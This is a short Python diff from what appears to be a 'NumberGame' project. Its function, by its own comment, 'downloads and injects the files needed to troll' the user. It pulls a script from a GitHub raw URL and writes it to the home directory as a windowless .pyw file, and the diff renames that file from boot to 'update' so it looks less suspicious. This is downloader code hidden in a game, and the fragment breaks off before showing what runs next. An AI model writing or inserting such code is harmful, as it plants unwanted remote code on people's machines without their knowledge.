@@ -1,9 +1,9 @@
 # Downloads and injects the files needed to troll your dumbass
 def clone():
     import os, urllib.request, pathlib
-    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/boot.py'
+    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py'
     home = os.path.expanduser("~")
-    path = str(home) + '/boot.pyw'
+    path = str(home) + '/update.pyw'
     path = '{}'.format(path)
     try:
         os.remove(path)
